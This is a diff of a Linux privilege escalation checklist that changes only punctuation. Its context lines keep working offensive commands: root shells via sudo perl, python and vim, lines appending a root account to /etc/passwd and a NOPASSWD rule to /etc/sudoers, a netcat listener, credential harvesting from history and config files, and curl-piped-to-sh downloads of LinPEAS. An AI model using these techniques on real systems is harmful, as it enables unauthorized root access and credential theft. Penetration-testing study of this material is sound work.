@@ -1,13 +1,13 @@
 # Linux Privilege Escalation Checklist
-**Status:** Living document — updated as new techniques are learned  
+**Status:** Living document:  updated as new techniques are learned  
 **Last Updated:** April 2026  
-**Reference:** GTFOBins (gtfobins.github.io) — essential companion to this document  
+**Reference:** GTFOBins (gtfobins.github.io):  essential companion to this document  
 
 ---
 
 ## Philosophy
 
-Privilege escalation on Linux is a systematic process, not a guessing game. The answer is almost always in one of the categories below. Work through them in order rather than jumping to the most complex techniques first — misconfigured sudo permissions and SUID binaries are found far more often than kernel exploits.
+Privilege escalation on Linux is a systematic process, not a guessing game. The answer is almost always in one of the categories below. Work through them in order rather than jumping to the most complex techniques first: misconfigured sudo permissions and SUID binaries are found far more often than kernel exploits.
 
 When you find a potential vector, verify it manually before running automated tools. Understanding why something works makes the technique transferable.
 
@@ -15,7 +15,7 @@ When you find a potential vector, verify it manually before running automated to
 
 ## Immediate Post-Shell Checklist
 
-Run these the moment you get a shell — before anything else.
+Run these the moment you get a shell: before anything else.
 
 ```bash
 # Who am I and what groups do I belong to
@@ -30,7 +30,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 # OR
 script /dev/null -c bash
 
-# After pty spawn — fix terminal
+# After pty spawn: fix terminal
 export TERM=xterm
 # Ctrl+Z
 stty raw -echo; fg
@@ -42,7 +42,7 @@ uname -a
 cat /etc/os-release
 cat /proc/version
 
-# Network context — what else is reachable
+# Network context : what else is reachable
 ip a
 ip route
 cat /etc/hosts
@@ -58,7 +58,7 @@ netstat -tulnp
 
 ---
 
-## Category 1 — Sudo Permissions
+## Category 1: Sudo Permissions
 
 **Check first. This is the most common path.**
 
@@ -66,7 +66,7 @@ netstat -tulnp
 sudo -l
 ```
 
-Whatever is listed — check GTFOBins immediately. Almost every binary has a documented technique.
+Whatever is listed: check GTFOBins immediately. Almost every binary has a documented technique.
 
 Common high-value sudo entries:
 
@@ -105,7 +105,7 @@ sudo perl -e 'exec "/bin/bash";'
 
 ---
 
-## Category 2 — SUID/SGID Binaries
+## Category 2: SUID/SGID Binaries
 
 Files with the SUID bit set run as their owner (usually root) regardless of who executes them.
 
@@ -120,7 +120,7 @@ find / -perm -2000 -type f 2>/dev/null
 find / -perm /6000 -type f 2>/dev/null
 ```
 
-Check every result against GTFOBins — filter by "SUID" category.
+Check every result against GTFOBins: filter by "SUID" category.
 
 Common SUID exploitation paths:
 
@@ -144,7 +144,7 @@ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
 ---
 
-## Category 3 — Cron Jobs
+## Category 3: Cron Jobs
 
 Cron jobs running as root that execute writable scripts are a reliable privesc path.
 
@@ -161,7 +161,7 @@ cat /etc/cron.hourly/*
 # User crontabs
 cat /var/spool/cron/crontabs/* 2>/dev/null
 
-# Running processes — catch jobs that aren't in crontab
+# Running processes: catch jobs that aren't in crontab
 ps aux
 
 # Watch for new processes (useful for identifying cron timing)
@@ -188,7 +188,7 @@ nc -lvnp 4444
 
 ---
 
-## Category 4 — Writable Files and Directories
+## Category 4: Writable Files and Directories
 
 ```bash
 # Files owned by root that current user can write
@@ -210,7 +210,7 @@ openssl passwd -1 -salt [salt] [password]
 # Add to /etc/passwd
 echo '[user]:[hash]:0:0:root:/root:/bin/bash' >> /etc/passwd
 
-# /etc/sudoers — if writable
+# /etc/sudoers: if writable
 echo '[current user] ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
 ```
 
@@ -221,7 +221,7 @@ echo '[current user] ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
 
 ---
 
-## Category 5 — Capabilities
+## Category 5: Capabilities
 
 Linux capabilities are a finer-grained alternative to SUID. Check for them separately.
 
@@ -247,7 +247,7 @@ vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec 
 
 ---
 
-## Category 6 — Sensitive Files and Credentials
+## Category 6: Sensitive Files and Credentials
 
 ```bash
 # Bash history — frequently contains plaintext passwords
@@ -279,7 +279,7 @@ cat /opt/*/config* 2>/dev/null
 
 ---
 
-## Category 7 — Kernel Exploits
+## Category 7: Kernel Exploits
 
 **Check last.** Kernel exploits are unstable and can crash systems. Use only when other paths are exhausted.
 
@@ -294,8 +294,8 @@ searchsploit linux kernel [version]
 ```
 
 Known kernel exploits worth knowing:
-- **DirtyCow (CVE-2016-5195)** — affects kernels < 4.8.3. Overwrites read-only memory.
-- **DirtyPipe (CVE-2022-0847)** — affects kernels 5.8–5.16.11.
+- **DirtyCow (CVE-2016-5195)**: affects kernels < 4.8.3. Overwrites read-only memory.
+- **DirtyPipe (CVE-2022-0847)**: affects kernels 5.8–5.16.11.
 
 ```bash
 # Check if DirtyCow applies
@@ -308,7 +308,7 @@ uname -r  # Should be < 4.8.3 for DirtyCow
 
 ---
 
-## Category 8 — Network Services on Localhost
+## Category 8: Network Services on Localhost
 
 Services bound to 127.0.0.1 don't appear in external scans. Check what's running locally after getting a shell.
 
@@ -321,7 +321,7 @@ Common findings: internal web servers, databases (MySQL/PostgreSQL), Redis insta
 
 ```bash
 # Port forward to access internal services from your machine
-# (SSH port forwarding — covered separately)
+# (SSH port forwarding: covered separately)
 ssh -L [local port]:127.0.0.1:[target port] [user]@[IP]
 ```
 
@@ -335,7 +335,7 @@ ssh -L [local port]:127.0.0.1:[target port] [user]@[IP]
 Run these after manual checks to catch anything missed. Understand the output before acting on it.
 
 ```bash
-# LinPEAS — comprehensive Linux privesc enumeration
+# LinPEAS: comprehensive Linux privesc enumeration
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 # LinEnum
@@ -352,21 +352,21 @@ chmod +x linpeas.sh
 ```
 
 - [ ] LinPEAS run
-- [ ] Output reviewed — focus on red and yellow highlighted items
+- [ ] Output reviewed: focus on red and yellow highlighted items
 - [ ] Any new findings from automated tools investigated manually
 
 ---
 
-## Quick Reference — Privilege Escalation Order
+## Quick Reference: Privilege Escalation Order
 
-1. `sudo -l` → GTFOBins
-2. SUID binaries → GTFOBins
-3. Cron jobs → writable scripts
+1. `sudo -l` > GTFOBins
+2. SUID binaries > GTFOBins
+3. Cron jobs > writable scripts
 4. Writable `/etc/passwd` or `/etc/sudoers`
-5. Capabilities → GTFOBins
-6. Sensitive files and credentials → password reuse
-7. Localhost services → database access
-8. Kernel exploits → last resort
+5. Capabilities > GTFOBins
+6. Sensitive files and credentials > password reuse
+7. Localhost services > database access
+8. Kernel exploits > last resort
 
 ---
 
